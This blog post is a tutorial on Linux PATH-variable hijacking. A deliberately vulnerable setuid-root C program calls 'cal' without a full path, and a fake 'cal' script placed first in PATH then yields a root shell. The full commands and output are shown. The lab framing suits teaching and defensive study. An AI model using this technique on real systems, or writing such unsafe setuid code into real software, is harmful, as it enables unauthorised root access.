---
layout: post
title: Privilege Escalation - PATH Variable
date: 2020-03-08 18:00:00
categories: posts
comments: false
en: true
---

# Introduction

### Hi there once again, the other day i found by sheer curiosity this type of privilege escalation, which seems rather interesting to me, that's why i will be explaining it today.

# The Bug

##### As the reader may already know, in Linux the $PATH is an environmental variable which allows the system to search for an executable on specific folders. For example, if i want to execute "ls", i don't have to resort to the full path, being /bin/ls, as it is already within the $PATH. However, there are binaries which sometimes do not use the full path and make use of such variable, that if maliciously manipulated, the file which is intended to run may be "spoofed", I.E: FTP server which makes a call to telnet without the full path, if the variable was changed to only "/tmp", telnet would only be searched for in such folder, ergo, if a file is placed there with the same name, it would get executed.

# The Exploitation

##### In order to demonstrate this phenomenon, a vulnerable application will be used.

### Source code:

```term
#include <stdio.h>

int main(){
    setuid(0);
    setgid(0);
    system("cal && time && date");
    return 0;
}
```

### This application should call calendar, time and date without the absolute path.

##### The application is compiled:

```term
root@whitecr0wz:~/vuln# gcc vuln.c -o vuln 
```

##### It is copied to /usr/bin/vuln, chmoded with user bits and finally checked:

```term
root@whitecr0wz:~/vuln# cp vuln /usr/bin/vuln
root@whitecr0wz:~/vuln# chmod u+s /usr/bin/vuln
root@whitecr0wz:~/vuln# ls -la /usr/bin/vuln 
-rwsr-xr-x 1 root root 16712 Aug 10 19:58 /usr/bin/vuln
root@whitecr0wz:~/vuln# 
```

##### After this is done, just su into your user.

##### If the application is run, it displays everything as intended:

```term
whitecr0wz@whitecr0wz:~/vuln$ /usr/bin/vuln
    August 2020       
Su Mo Tu We Th Fr Sa  
                   1  
 2  3  4  5  6  7  8  
 9 10 11 12 13 14 15  
16 17 18 19 20 21 22  
23 24 25 26 27 28 29  
30 31                 
Usage: time [-apvV] [-f format] [-o file] [--append] [--verbose]
       [--portability] [--format=format] [--output=file] [--version]
       [--quiet] [--help] command [arg...]
whitecr0wz@whitecr0wz:~/vuln$ 
```

##### Moreover, if strings is used and grepped for "cal", the system call may be found:

```term
whitecr0wz@whitecr0wz:~/vuln$ strings /usr/bin/vuln | grep cal 
cal && time && date
whitecr0wz@whitecr0wz:~/vuln$
```

##### The command that will be spoofed is cal, due to the fact that it is the first to be called:

```term
whitecr0wz@whitecr0wz:~/vuln$ cat cal 
#!/bin/bash
/bin/bash
whitecr0wz@whitecr0wz:~/vuln$ 
```

##### The file is chmodded with 777 bits:

```term
whitecr0wz@whitecr0wz:~/vuln$ chmod 777 cal 
```

##### Now, where the fun begins, the $PATH variable is exported into the current working directory, being "/home/whitecr0wz/vuln" the first folder where the system will check for any executable without a full path, therefore, "/home/whitecr0wz/vuln/vuln" will be encountered prior to /usr/bin/vuln:

```term
whitecr0wz@whitecr0wz:~/vuln$ pwd 
/home/whitecr0wz/vuln
whitecr0wz@whitecr0wz:~/vuln$ export PATH=/home/whitecr0wz/vuln:$PATH 
whitecr0wz@whitecr0wz:~/vuln$ echo $PATH
/home/whitecr0wz/vuln:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
whitecr0wz@whitecr0wz:~/vuln$ 
```

##### Last but not least, vuln is executed, spoofing /usr/bin/cal for /home/whitecr0wz/vuln/cal, which leads to a root shell:

```term
whitecr0wz@whitecr0wz:~/vuln$ /usr/bin/vuln 
root@whitecr0wz:~/vuln# 
```
